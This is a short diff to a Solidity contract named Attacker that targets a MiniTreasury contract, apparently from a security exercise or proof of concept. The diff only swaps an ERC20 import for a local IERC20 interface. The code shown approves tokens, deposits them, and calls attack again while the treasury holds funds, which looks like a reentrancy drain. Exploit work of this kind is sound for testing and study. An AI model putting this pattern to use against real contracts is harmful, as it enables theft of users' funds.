@@ -2,7 +2,7 @@
 pragma solidity ^0.8.24;
 
 import "./MiniTreasury.sol";
-import {ERC20} from "../lib/solmate/src/tokens/ERC20.sol";
+import {IERC20} from "./Interfaces/IERC20.sol";
 
 contract Attacker {
     MiniTreasury public treasury;
@@ -14,7 +14,7 @@ contract Attacker {
     }
 
     function deposit(uint256 amount) external {
-        ERC20(token).approve(address(treasury), type(uint256).max);
+        IERC20(token).approve(address(treasury), type(uint256).max);
         // Deposit ERC20 tokens to the treasury
         treasury.depositERC20(token, amount);
     }
@@ -26,7 +26,7 @@ contract Attacker {
     }
 
     function withdraw() internal {
-        if (ERC20(token).balanceOf(address(treasury)) > 0) {
+        if (IERC20(token).balanceOf(address(treasury)) > 0) {
             attack(1);
         }
     }
